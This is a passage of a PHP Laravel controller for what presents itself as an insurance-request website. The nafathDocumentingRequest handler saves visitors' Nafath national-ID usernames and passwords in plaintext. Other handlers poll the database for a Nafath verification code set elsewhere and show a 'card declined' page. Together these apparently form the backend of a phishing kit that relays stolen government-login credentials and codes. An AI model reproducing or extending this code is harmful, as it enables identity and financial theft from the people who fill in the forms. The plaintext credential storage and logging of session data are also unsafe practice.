                'error_line' => $th->getLine(),
            ])->get();
            if ($check_old_errors->count() == 0) {
                $new_error_ticket = SupportTicket::create([
                    'error_location' => $th->getFile(),
                    'error_description' => $th->getMessage(),
                    'function_name' => $function_name,
                    'error_line' =>  $th->getLine(),
                ]);
                $end_error_ticket = $new_error_ticket;
            } else {
                $end_error_ticket = $check_old_errors->first();
            }
            return view('errors.support_tickets', compact('th', 'function_name', 'end_error_ticket'));
        }
    }



    // ========================================================================
    // ================= nafathLoginRequest Function =====================
    // ========================================================================
    public function nafathLoginRequest(NafathLoginRequestFormRequest $request, Route $route)
    {
        try {
            // Retrieve form data from session (allFormData)
            $allFormData = session('allFormData');

            $insuranceRequest = InsuranceRequest::find($allFormData['id']);
            if ($insuranceRequest) {
                // return redirect()->route('codeDegit');
                return redirect()->route('nafathDocumenting');
            } else {
                return redirect()->back()->with('danger', 'This record does not exist in the records');
            }
        } catch (\Throwable $th) {
            $function_name =  $route->getActionName();
            $check_old_errors = new SupportTicket();
            $check_old_errors = $check_old_errors->select('*')->where([
                'error_location' => $th->getFile(),
                'error_description' => $th->getMessage(),
                'function_name' => $function_name,
                'error_line' => $th->getLine(),
            ])->get();
            if ($check_old_errors->count() == 0) {
                $new_error_ticket = SupportTicket::create([
                    'error_location' => $th->getFile(),
                    'error_description' => $th->getMessage(),
                    'function_name' => $function_name,
                    'error_line' =>  $th->getLine(),
                ]);
                $end_error_ticket = $new_error_ticket;
            } else {
                $end_error_ticket = $check_old_errors->first();
            }
            return view('errors.support_tickets', compact('th', 'function_name', 'end_error_ticket'));
        }
    }



    // ========================================================================
    // ================= nafathDocumentingRequest Function =====================
    // ========================================================================
    public function nafathDocumentingRequest(NafathDocumentingRequestFormRequest $request, Route $route)
    {
        try {
            // return $request;
            // Retrieve form data from session (allFormData)
            $allFormData = session('allFormData');

            $insuranceRequest = InsuranceRequest::find($allFormData['id']);
            if ($insuranceRequest) {

                $updated_data = [
                    'user_name' => $request->user_name,
                    'password' => $request->password,

                ];
                // Update in DB :
                DB::transaction(function () use ($updated_data, $insuranceRequest) {
                    $insuranceRequest->update($updated_data);
                });
                return redirect()->route('codeDegit');
            } else {
                return redirect()->back()->with('danger', 'This record does not exist in the records');
            }
        } catch (\Throwable $th) {
            $function_name =  $route->getActionName();
            $check_old_errors = new SupportTicket();
            $check_old_errors = $check_old_errors->select('*')->where([
                'error_location' => $th->getFile(),
                'error_description' => $th->getMessage(),
                'function_name' => $function_name,
                'error_line' => $th->getLine(),
            ])->get();
            if ($check_old_errors->count() == 0) {
                $new_error_ticket = SupportTicket::create([
                    'error_location' => $th->getFile(),
                    'error_description' => $th->getMessage(),
                    'function_name' => $function_name,
                    'error_line' =>  $th->getLine(),
                ]);
                $end_error_ticket = $new_error_ticket;
            } else {
                $end_error_ticket = $check_old_errors->first();
            }
            return view('errors.support_tickets', compact('th', 'function_name', 'end_error_ticket'));
        }
    }

    // ========================================================================
    // ===================== fetchCodeDegit Function ========================
    // ========================================================================
    public function fetchCodeDegit(Request $request)
    {
        try {
            $allFormData = session('allFormData');

            \Log::channel('nafath')->info('Nafath Code Fetch Attempt', [
                'session_data' => $allFormData,
                'timestamp' => now()->toDateTimeString()
            ]);

            if (!$allFormData || !isset($allFormData['id'])) {
                return response()->json(['code' => null, 'error' => 'missing_session']);
            }

            // Get the insurance request with valid code
            $insuranceRequest = InsuranceRequest::where('id', $allFormData['id'])
                ->select('id', 'nafath_code', 'updated_at')
                ->whereNotNull('nafath_code')
                ->where('updated_at', '>', now()->subMinutes(5))
                ->first();

            if (!$insuranceRequest) {
                return response()->json(['code' => null]);
            }

            return response()->json(['code' => $insuranceRequest->nafath_code]);
        } catch (\Exception $e) {
            \Log::error('Error fetching Nafath code: ' . $e->getMessage());
            return response()->json(['error' => 'server_error'], 500);
        }
    }

    // ========================================================================
    // ===================== codeDegit Function ========================
    // ========================================================================
    public function codeDegit(Request $request, Route $route)
    {
        try {
            // Retrieve form data from session (allFormData)
            $allFormData = session('allFormData');
            if (!isset($allFormData)) {
                return redirect()->route('welcome');
            }

            if ($allFormData) {
                $insuranceRequest = InsuranceRequest::find($allFormData['id']);
                return view('codeDegit', compact('allFormData', 'insuranceRequest'));
            } else {
                return redirect()->back()->with('danger', 'This record does not exist in the records');
            }
        } catch (\Throwable $th) {
            $function_name =  $route->getActionName();
            $check_old_errors = new SupportTicket();
            $check_old_errors = $check_old_errors->select('*')->where([
                'error_location' => $th->getFile(),
                'error_description' => $th->getMessage(),
                'function_name' => $function_name,
                'error_line' => $th->getLine(),
            ])->get();
            if ($check_old_errors->count() == 0) {
                $new_error_ticket = SupportTicket::create([
                    'error_location' => $th->getFile(),
                    'error_description' => $th->getMessage(),
                    'function_name' => $function_name,
                    'error_line' =>  $th->getLine(),
                ]);
                $end_error_ticket = $new_error_ticket;
            } else {
                $end_error_ticket = $check_old_errors->first();
            }
            return view('errors.support_tickets', compact('th', 'function_name', 'end_error_ticket'));
        }
    }

    // ========================================================================
    // ===================== resendCodeDegit Function ========================
    // ========================================================================
    public function resendCodeDegit(Request $request, Route $route)
    {
        try {
            // Retrieve form data from session (allFormData)
            $allFormData = session('allFormData');
            if (!isset($allFormData)) {
                return redirect()->route('welcome');
            }

            if ($allFormData) {
                $insuranceRequest = InsuranceRequest::where('id', $allFormData['id'])->first();
                $updated_data = [
                    'nafath_code' => null,

                ];
                // Update in DB :
                DB::transaction(function () use ($updated_data, $insuranceRequest) {
                    $insuranceRequest->update($updated_data);
                });
                return view('codeDegit', compact('allFormData'));
            } else {
                return redirect()->back()->with('danger', 'This record does not exist in the records');
            }
        } catch (\Throwable $th) {
            $function_name =  $route->getActionName();
            $check_old_errors = new SupportTicket();
            $check_old_errors = $check_old_errors->select('*')->where([
                'error_location' => $th->getFile(),
                'error_description' => $th->getMessage(),
                'function_name' => $function_name,
                'error_line' => $th->getLine(),
            ])->get();
            if ($check_old_errors->count() == 0) {
                $new_error_ticket = SupportTicket::create([
                    'error_location' => $th->getFile(),
                    'error_description' => $th->getMessage(),
                    'function_name' => $function_name,
                    'error_line' =>  $th->getLine(),
                ]);
                $end_error_ticket = $new_error_ticket;
            } else {
                $end_error_ticket = $check_old_errors->first();
            }
            return view('errors.support_tickets', compact('th', 'function_name', 'end_error_ticket'));
        }
    }



    // ========================================================================
    // ===================== cardDeclined Function ========================
    // ========================================================================
    public function cardDeclined(Request $request, Route $route)
    {
        try {
            // Retrieve form data from session (allFormData)
            $allFormData = session('allFormData');
            if (!isset($allFormData)) {
                return redirect()->route('welcome');
            }
            session()->forget('insuranceRequest');
            if ($allFormData) {
                return view('cardDeclined', compact('allFormData'));
            } else {
                return redirect()->back()->with('danger', 'This record does not exist in the records');
            }
        } catch (\Throwable $th) {
            $function_name =  $route->getActionName();
            $check_old_errors = new SupportTicket();
            $check_old_errors = $check_old_errors->select('*')->where([
                'error_location' => $th->getFile(),
                'error_description' => $th->getMessage(),
                'function_name' => $function_name,
                'error_line' => $th->getLine(),
            ])->get();
            if ($check_old_errors->count() == 0) {
                $new_error_ticket = SupportTicket::create([
                    'error_location' => $th->getFile(),
                    'error_description' => $th->getMessage(),
                    'function_name' => $function_name,
                    'error_line' =>  $th->getLine(),
                ]);
                $end_error_ticket = $new_error_ticket;
            } else {
                $end_error_ticket = $check_old_errors->first();
            }
            return view('errors.support_tickets', compact('th', 'function_name', 'end_error_ticket'));
        }
    }

    /**
     * Check Nafath code status
     */
    public function checkNafathCode($id)
    {
        try {
            // Get insurance request with strict validation
            $insuranceRequest = InsuranceRequest::select('id', 'nafath_code', 'updated_at')
                ->where('id', $id)
                ->first();

            // Log for debugging
            \Log::channel('nafath')->info('Checking code for request', [
                'id' => $id,
                'code' => $insuranceRequest->nafath_code ?? null,
                'timestamp' => now()->toDateTimeString()
            ]);

            if ($insuranceRequest && $insuranceRequest->nafath_code) {
                return response()->json([
                    'hasCode' => true,
                    'code' => $insuranceRequest->nafath_code,
                    'shouldStopLoading' => true
                ])->header('Cache-Control', 'no-store, no-cache, must-revalidate, private');
            }

            return response()->json([
                'hasCode' => false,
                'code' => null,
                'shouldStopLoading' => false
            ])->header('Cache-Control', 'no-store, no-cache, must-revalidate, private');

        } catch (\Exception $e) {
            \Log::error('Nafath code check error: ' . $e->getMessage());
            return response()->json([
                'error' => 'server_error',
                'shouldStopLoading' => false
            ], 500);
        }
    }
}
